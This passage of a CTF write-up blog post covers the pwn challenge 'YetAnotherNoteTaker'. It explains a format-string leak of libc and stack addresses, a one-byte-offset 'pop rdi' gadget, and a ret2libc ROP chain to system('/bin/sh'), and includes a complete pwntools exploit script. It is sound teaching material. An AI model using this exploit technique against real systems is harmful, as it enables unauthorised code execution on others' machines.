+argument of the <code>main()</code> func - <code>0x7ffef2f088b8</code>. In gdb we can see that:
+* <code>0x7ffef2f088b8 - 0x7ffef2f087d8 = 0xe0</code>
+So to compute the stack address where the return addres will be stored,
+we need to:
+* <code>ret_addr_addr = 45th_arg - 0xe0</code></p></li><li><p>The address of the <code>system()</code> function in libc at runtime. For example, the
+43rd argument of <code>printf()</code> we leaked is <code>0x78de48620840</code> - this seems to be
+some function in libc, and it can help us to determine the libc base at
+runtime. For example, by computing <code>0x78de48620840 - libc base</code> we get the
+offset <code>0x20840</code>, which happens to be an address in the <code>libc_main()</code>
+function (check the <code>libc.so.6</code> file). In order to get the address of system
+we can do:
+* <code>system_addr = (43rd_arg - 0x20840) + system_offset</code></p><p>The offset of the <code>system()</code> function happens to be <code>0x453A0</code> (again, check
+the <code>libc.so.6</code> file), so for the sake of this example, the virtual address
+of the <code>system()</code> function will be:
+* <code>system_addr = (0x78de48620840 - 0x20840) + 0x453A0 = 0x78de486453a0</code></p></li><li><p>Ok, so we can beat the <code>ASLR</code> and redirect the control to where we want, now
+what? We still need to pass the right argument to <code>system()</code> - the &ldquo;/bin/sh&rdquo;
+string, and that&rsquo;s the tricky part!</p></li></ol><p>To do that last bit, we need a way of passing the input into the program, but
+with the current program that&rsquo;s impossible. We can still use the powerful format
+string primitive, as the string &ldquo;/bin/sh&rdquo; happens to be present in the libc too
+at the offset <code>0x18CE57</code>:</p><div class=code-block><div class=code-header><span data-label-text=Asm><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.rodata:</span><span class=err>000000000018</span><span class=nf>CE57</span> <span class=no>aBinSh</span>          <span class=no>db</span> <span class=err>&#39;/</span><span class=no>bin</span><span class=err>/</span><span class=no>sh</span><span class=err>&#39;</span><span class=p>,</span><span class=mi>0</span>          <span class=c1>; DATA XREF: sub_44E30+451â†‘o
+</span></span></span><span class=line><span class=cl><span class=nl>.rodata:</span><span class=err>000000000018</span><span class=nf>CE57</span>                                         <span class=c1>; _IO_proc_open+306â†‘o ...
+</span></span></span><span class=line><span class=cl><span class=nl>.rodata:</span><span class=err>000000000018</span><span class=nf>CE5F</span> <span class=no>aExit0</span>          <span class=no>db</span> <span class=err>&#39;</span><span class=no>exit</span> <span class=mi>0</span><span class=err>&#39;</span><span class=p>,</span><span class=mi>0</span>           <span class=c1>; DATA XREF: __libc_system:loc_453B0â†‘o
+</span></span></span><span class=line><span class=cl><span class=nl>.rodata:</span><span class=err>000000000018</span><span class=nf>CE66</span> <span class=no>aCanonicalizeC</span>  <span class=no>db</span> <span class=err>&#39;</span><span class=no>canonicalize.c</span><span class=err>&#39;</span><span class=p>,</span><span class=mi>0</span>   <span class=c1>; DATA XREF: realpath_0+55Dâ†‘o</span></span></span></code></pre></td></tr></table></div></div></div><p>You guess it, we can compute the address of this string in the virtual memory in
+the same way we computed the address of <code>system()</code> ;-)</p><p>There&rsquo;s one last thing in the way: how do we pass that string address as an
+argument to <code>system()</code>?</p><p>First off, remember that <code>system()</code> takes only one argument, which should be a
+pointer to a string (e.g., <code>char *</code>) and that in <code>x64</code> the first argument must
+be located in the <code>rdi</code> register [8]. To achieve that we can use a bit of
+Return-oriented programming [7] and place the pointer to &ldquo;/bin/sh&rdquo; on the stack,
+then pop it, and return <code>system()</code>, so we should do something like:</p><div class=code-block><div class=code-header><span data-label-text=Asm><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl>    <span class=nf>pop</span>  <span class=no>rdi</span>     <span class=err>&lt;</span><span class=p>---</span> <span class=no>gets</span> <span class=no>the</span> <span class=no>address</span> <span class=no>of</span> <span class=err>&#34;/</span><span class=no>bin</span><span class=err>/</span><span class=no>sh</span><span class=err>&#34;</span> <span class=no>off</span> <span class=no>the</span> <span class=no>stack</span> <span class=no>and</span> <span class=no>puts</span> <span class=no>it</span> <span class=no>into</span> <span class=no>rdi</span>
+</span></span><span class=line><span class=cl>    <span class=nf>pop</span>  <span class=no>rax</span>     <span class=err>&lt;</span><span class=p>---</span> <span class=no>pops</span> <span class=no>the</span> <span class=no>return</span> <span class=no>address</span> <span class=no>off</span> <span class=no>the</span> <span class=no>stack</span>
+</span></span><span class=line><span class=cl>    <span class=nf>call</span> <span class=no>rax</span>     <span class=err>&lt;</span><span class=p>---</span> <span class=no>calls</span> <span class=no>it</span></span></span></code></pre></td></tr></table></div></div></div><p>The problem is, there are no such gadgets that pop the rdi register. The closest
+we can find at first is this:</p><div class=code-block><div class=code-header><span data-label-text=Asm><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>BF6</span> <span class=no>loc_400BF6</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>BF6</span>                 <span class=no>add</span>     <span class=no>rsp</span><span class=p>,</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>BFA</span>                 <span class=no>pop</span>     <span class=no>rbx</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>BFB</span>                 <span class=no>pop</span>     <span class=no>rbp</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>BFC</span>                 <span class=no>pop</span>     <span class=no>r12</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>BFE</span>                 <span class=no>pop</span>     <span class=no>r13</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>C00</span>                 <span class=no>pop</span>     <span class=no>r14</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>C02</span>                 <span class=no>pop</span>     <span class=no>r15</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>C04</span>                 <span class=no>retn</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>C04</span> <span class=c1>; } // starts at 400BA0
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400</span><span class=nf>C04</span> <span class=no>__libc_csu_init</span> <span class=no>endp</span></span></span></code></pre></td></tr></table></div></div></div><p>Fret not, there&rsquo;s a neat trick that&rsquo;s possible because the <code>x64</code> instructions
+are variable length:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> x/4i 0x400c02
+</span></span><span class=line><span class=cl>   0x400c02 &lt;__libc_csu_init+98&gt;:       pop    r15
+</span></span><span class=line><span class=cl>   0x400c04 &lt;__libc_csu_init+100&gt;:      ret
+</span></span><span class=line><span class=cl>   0x400c05:    nop
+</span></span><span class=line><span class=cl>   0x400c06:    cs nop WORD PTR <span class=o>[</span>rax+rax*1+0x0<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> x/4i 0x400c03
+</span></span><span class=line><span class=cl>   0x400c03 &lt;__libc_csu_init+99&gt;:       pop    rdi
+</span></span><span class=line><span class=cl>   0x400c04 &lt;__libc_csu_init+100&gt;:      ret
+</span></span><span class=line><span class=cl>   0x400c05:    nop
+</span></span><span class=line><span class=cl>   0x400c06:    cs nop WORD PTR <span class=o>[</span>rax+rax*1+0x0<span class=o>]</span></span></span></code></pre></td></tr></table></div></div></div><p>See what I did there? By flipping one byte (02 to 03) I changed the semantics of
+<code>pop r15</code> into <code>pop rdi</code> - isn&rsquo;t that a neat trick?</p><p>Anyway, we now have all the parts we need, so here&rsquo;s what we are going to do:</p><ol><li>Leak the libc and the stack addresses (43rd and 45th args).</li><li>Compute the libc base, then the address of <code>system()</code> and the &ldquo;/bin/sh&rdquo;
+string. Compute the address of <code>main()</code> return address.</li><li>Place the address of the <code>pop rdi; retn</code> gadget on the stack, in place of the
+original return address. Place the pointer to &ldquo;/bin/sh&rdquo; next (retaddr+8), and
+the address of <code>system()</code> just after that (retaddr+16).</li><li>Exit main to trigger the ROP chain. Read the flag :-)</li></ol><h1 id=the-exploit-script id=the-exploit-script>The exploit script</h1><div class=code-block><div class=code-header><span data-label-text=Python><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=s2>&#34;./yetAnotherNoteTaker/notetaker&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>io = gdb.debug(p, &#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s1>    b *0x400b94
+</span></span></span><span class=line><span class=cl><span class=s1>    continue
+</span></span></span><span class=line><span class=cl><span class=s1>&#34;&#34;&#34;)
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;%43$p-%45$p&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>addrz</span> <span class=o>=</span> <span class=n>out</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>libc_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>addrz</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>stack_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>addrz</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>libc_leak</span> <span class=o>-</span> <span class=mh>0x20840</span>
+</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x453a0</span>
+</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x18ce57</span>
+</span></span><span class=line><span class=cl><span class=n>retaddr</span> <span class=o>=</span> <span class=n>stack_leak</span> <span class=o>-</span> <span class=mh>0xe0</span>
+</span></span><span class=line><span class=cl><span class=n>gadgetaddr</span> <span class=o>=</span> <span class=mh>0x400c03</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SYSTEM: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>system</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;BINSH: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;RETADDR: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>retaddr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># overwrite the return address with the ROP gadget</span>
+</span></span><span class=line><span class=cl><span class=n>fmt_payload</span> <span class=o>=</span> <span class=n>pwnlib</span><span class=o>.</span><span class=n>fmtstr</span><span class=o>.</span><span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=p>{</span><span class=n>retaddr</span><span class=p>:</span><span class=n>gadgetaddr</span><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>fmt_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># put the first argument to system (&#34;/bin/sh&#34;) on the stack</span>
+</span></span><span class=line><span class=cl><span class=n>fmt_payload</span> <span class=o>=</span> <span class=n>pwnlib</span><span class=o>.</span><span class=n>fmtstr</span><span class=o>.</span><span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=p>{</span><span class=n>retaddr</span><span class=o>+</span><span class=mi>8</span><span class=p>:</span><span class=n>binsh</span><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>fmt_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># put the address of system on the stack</span>
+</span></span><span class=line><span class=cl><span class=n>fmt_payload</span> <span class=o>=</span> <span class=n>pwnlib</span><span class=o>.</span><span class=n>fmtstr</span><span class=o>.</span><span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=p>{</span><span class=n>retaddr</span><span class=o>+</span><span class=mi>16</span><span class=p>:</span><span class=n>system</span><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>fmt_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#---------------</span>
+</span></span><span class=line><span class=cl><span class=c1># exit main and execute the ROP</span>
+</span></span><span class=line><span class=cl><span class=c1>#---------------</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#---------------</span>
+</span></span><span class=line><span class=cl><span class=c1># do &#34;cat flag&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>#---------------</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div></div><h1 id=references id=references>References</h1><p>[1] <a href=https://cs155.stanford.edu/papers/formatstring-1.2.pdf>https://cs155.stanford.edu/papers/formatstring-1.2.pdf</a><br>[2] <a href=https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro>https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro</a><br>[3] <a href=https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage>https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage</a><br>[4] <a href=https://en.wikipedia.org/wiki/W%5EX>https://en.wikipedia.org/wiki/W%5EX</a><br>[5] <a href=https://en.wikipedia.org/wiki/Address_space_layout_randomization>https://en.wikipedia.org/wiki/Address_space_layout_randomization</a><br>[6] <a href=https://en.wikipedia.org/wiki/Return-to-libc_attack>https://en.wikipedia.org/wiki/Return-to-libc_attack</a><br>[7] <a href=https://en.wikipedia.org/wiki/Return-oriented_programming>https://en.wikipedia.org/wiki/Return-oriented_programming</a><br>[8] <a href=https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame>https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame</a><br>[9] <a href=https://docs.pwntools.com/en/dev/fmtstr.html>https://docs.pwntools.com/en/dev/fmtstr.html</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"><i class="far fa-folder-open fa-fw me-1"></i>
+<a href=/categories/writeups/>Writeups</a>
+,
+<a href=/categories/writeups/pwn/>Pwn</a></div><div class=post-tags><i class="fa fa-tags fa-fw me-1"></i>
+<a href=/tags/ctf/ class="post-tag no-text-decoration">CTF</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2"><div class=license-wrapper>This post is licensed under <a href=https://creativecommons.org/licenses/by/4.0/>CC BY 4.0</a> by the author.</div></div></div></article></main><aside aria-label=Panel id=panel-wrapper class="col-xl-3 ps-2 text-muted"><div class=access><section id=access-lastmod><h2 class=panel-heading>Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"><a href=/post/pascalctf-web-zazastore/>PascalCTF 2026 - Zazastore</a></li><li class="text-truncate lh-lg"><a href=/post/pascalctf-pwn-yetanothernotetaker/>PascalCTF 2026 - YetAnotherNoteTaker</a></li><li class="text-truncate lh-lg"><a href=/post/heroctf-web-revoked/>HeroCTF 2025 - Revoked & Revoked Revenge</a></li><li class="text-truncate lh-lg"><a href=/post/o24-forensic-ghost_in_the_wall/>O24 CTF 2024 - Ghost In The Wall</a></li><li class="text-truncate lh-lg"><a href=/post/hsctf9-crypto-otp/>HSCTF 9 - OTP</a></li></ul></section><section><h2 class=panel-heading>Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"><a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/crypto/>crypto</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/ctf/>ctf</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/flask/>flask</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/heroctf/>heroctf</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/hsctf/>hsctf</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/javascript/>javascript</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/jwt/>jwt</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/linux/>linux</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/logic-flaw/>logic flaw</a>
+<a class="post-tag btn btn-outline-primary" href=https://l1ncctf.github.io/tags/pcap/>pcap</a></div></section></div></aside></div><div class=row><div id=tail-wrapper class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id=related-posts aria-labelledby=related-label><h3 class=mb-4 id=related-label>Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class=col><a href=/post/pascalctf-web-zazastore/ class="post-preview card h-100"><div class=card-body><time data-ts=1780272000 data-df=ll>%b %e, %Y</time><h4 class="pt-0 my-2">PascalCTF 2026 - Zazastore</h4><div class=text-muted><p>How a missing product validation and JavaScript's silent type coercion combine to let you buy anything for free — and why fail-closed design matters.</p></div></div></a></article><article class=col><a href=/post/hsctf9-web-gallery/ class="post-preview card h-100"><div class=card-body><time data-ts=1652140800 data-df=ll>%b %e, %Y</time><h4 class="pt-0 my-2">HSCTF 9 - Gallery</h4><div class=text-muted><p>A simple web challenge involving directory traversal. &amp;lt;span class=&amp;quot;me-2&amp;quot;&amp;gt;Description&amp;lt;/span&amp;gt; &amp;lt;a href=&amp;quot;#description&amp;quot; class=&amp;quot;anchor text-muted&amp;quot;&amp;gt;&amp;lt;i …</p></div></div></a></article><article class=col><a href=/post/hsctf9-crypto-quagmire_i/ class="post-preview card h-100"><div class=card-body><time data-ts=1655078400 data-df=ll>%b %e, %Y</time><h4 class="pt-0 my-2">HSCTF 9 - Quagmire-I</h4><div class=text-muted><p>Easy crypto that can be solved manually. &amp;lt;span class=&amp;quot;me-2&amp;quot;&amp;gt;Description&amp;lt;/span&amp;gt; &amp;lt;a href=&amp;quot;#description&amp;quot; class=&amp;quot;anchor text-muted&amp;quot;&amp;gt;&amp;lt;i class=&amp;quot;fas …</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"><a href=/post/heroctf-web-revoked/ class="btn btn-outline-primary" aria-label=Older><p>HeroCTF 2025 - Revoked & Revoked Revenge</p></a><a href=/post/pascalctf-web-zazastore/ class="btn btn-outline-primary" aria-label=Newer><p>PascalCTF 2026 - Zazastore</p></a></nav><footer aria-label="Site Info" class="d-flex flex-column justify-content-center text-muted
+flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3"><p>©
+<time>2026</time>
+<a href=https://github.com/orgs/L1NCCTF>L1NC</a>.
